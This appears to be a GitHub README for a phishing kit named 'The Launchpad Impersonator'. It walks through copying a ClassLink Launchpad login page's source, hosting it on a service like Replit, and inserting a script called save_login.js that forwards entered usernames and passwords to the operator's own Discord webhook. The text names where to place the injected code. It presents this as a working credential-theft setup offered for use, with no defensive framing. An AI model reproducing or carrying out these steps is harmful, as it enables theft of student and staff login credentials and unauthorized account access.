# The Launchpad Impersonator
Impersonate lauchpad.classlink.com sites with your own and forward login details to a Discord webhook!
<br>
<br>
**Some Simple Easy Steps:** <br>
  1: First get the HTML code of your login page (I.E: launchpad.classlink.com/BCS) using the keybind CRTL + U or right click and select page source <br>
  2: Copy and paste it into something like a replit. If your using replit make a html or php web server one and paste it into an empty file labeled index.html <br>
  3: Now create a new file labled save_login.js or lable it something else idrc <br> 
  4: In the save_login.js file paste in the code from the github, labeled **save_login.js**, make sure to set your own discord webhook <br> 
  5: Now under index.html where you pasted your classlink code find where it says <button type="button" id="signin" name="signin" class="btn btn-primary btn-block btnlogin" data-loading-text="Please wait" aria-label="Sign In">Sign In</button> and then paste the code in htmljs.txt in the github inbetween the button tag and the </form> tag  (Image below)<br>![image](https://github.com/ISBP/LaunchPadImpersonator/assets/125078014/ae073702-a8f4-4d10-9d9e-782e9d7d7104)

  6: Now put <script src="save_login.js"></script> right under <meta name="viewport" content="width=device-width, initial-scale=1"> <br>
  7: After this it should be working, and if it's not, do crtl + shift + I and click on network and try again to see what goes wrong. <br>
